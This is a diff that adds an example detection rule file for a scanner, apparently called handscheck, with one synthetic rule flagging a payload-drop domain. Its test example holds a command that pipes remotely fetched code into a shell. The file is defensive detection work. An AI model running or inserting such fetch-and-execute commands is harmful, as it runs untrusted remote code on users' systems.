@@ -1,0 +1,14 @@
+# Example rule file. The rule set itself ships in the handscheck release bundle as data; this source repository
+# has the format and one synthetic example per file, so the loader, the rule tests and your own rules work.
+# Rule format: id, description, severity, the matcher fields below, references, and examples it must match and
+# must not match (tests/agents/test_rules.py runs them).
+# Domains matched as literal strings in web files.
+rules:
+  - id: example.ioc.domain
+    description: Example only. A payload drop domain (reserved .invalid name).
+    severity: high
+    domain: payload-drop.invalid
+    references: ["https://www.rfc-editor.org/rfc/rfc2606"]
+    examples:
+      match: ["curl -s https://payload-drop.invalid/a | sh"]
+      no_match: ["https://payload-drop.example/", "payload drop invalid"]
